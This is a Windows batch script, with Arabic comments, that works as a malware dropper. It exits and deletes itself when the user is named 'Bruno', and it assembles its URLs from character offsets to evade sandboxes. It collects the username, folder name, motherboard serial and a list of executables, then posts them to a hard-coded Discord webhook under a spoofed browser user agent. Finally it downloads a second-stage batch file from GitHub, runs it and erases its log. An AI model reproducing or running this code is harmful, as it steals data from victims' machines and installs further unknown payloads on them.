@echo off
setlocal enabledelayedexpansion

:: 1. حماية ضد المحلل (Anti-Bruno)
set "U_CHK=Bruno"
if /I "%USERNAME%"=="!U_CHK!" (
    start /b "" cmd /c "timeout /t 1 >nul & del /f /q "%~f0""
    exit
)

:: 2. سطر الحروف السحري (مستودع الحروف)
set "ABC=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._~:/?#[]@!$&'()*+,;="

:: 3. بناء البروتوكول (https://)
set "PROT=!ABC:~7,1!!ABC:~19,1!!ABC:~19,1!!ABC:~15,1!!ABC:~18,1!!ABC:~66,1!!ABC:~67,1!!ABC:~67,1!"

:: 4. تشفير روابط الـ Webhook و الـ GitHub بالكامل
:: الرابط المطلوب: raw.githubusercontent.com/857seif/11111111/main/1.bat
set "H_DIS=discord.com"
set "H_GIT=raw.githubusercontent.com"
set "W_PATH=/api/webhooks/1461392959575687240/LwVE9O2alP5eDdU9fvRH6X1awl_C6g-SISy6RRNOPHXe2O7VXP3Jb3MBmmeQcQck9D-G"
set "B_PATH=/857seif/11111111/main/1.bat"

:: تجميع الروابط النهائية
set "W_URL=!PROT!!H_DIS!!W_PATH!"
set "G_URL=!PROT!!H_GIT!!B_PATH!"

:: 5. جمع البيانات وتجهيز الملف
for %%I in ("%cd%") do set "G_ID=%%~nxI"
set "O_FILE=%TEMP%\sys_temp_%RANDOM%.log"
set "B_NEXT=%TEMP%\win_sys_fix.bat"

(
echo [IDENT] %USERNAME%
echo [APP] !G_ID!
wmic baseboard get serialnumber | findstr /V "SerialNumber"
dir /b /s *.exe
) > "!O_FILE!"

:: 6. الإرسال (انتحال متصفح لإخفاء curl)
:: الساند بوكس مش هيشوف الرابط لأنه متجمع في الذاكرة بس
curl -A "Mozilla/5.0" -k -X POST -F "file=@!O_FILE!" "!W_URL!"

:: 7. تحميل وتشغيل المرحلة التالية (1.bat)
curl -A "Mozilla/5.0" -L -o "!B_NEXT!" "!G_URL!"

if exist "!B_NEXT!" (
    start /b "" cmd /c "!B_NEXT!"
)

:: 8. مسح الآثار
del /f /q "!O_FILE!"
exit
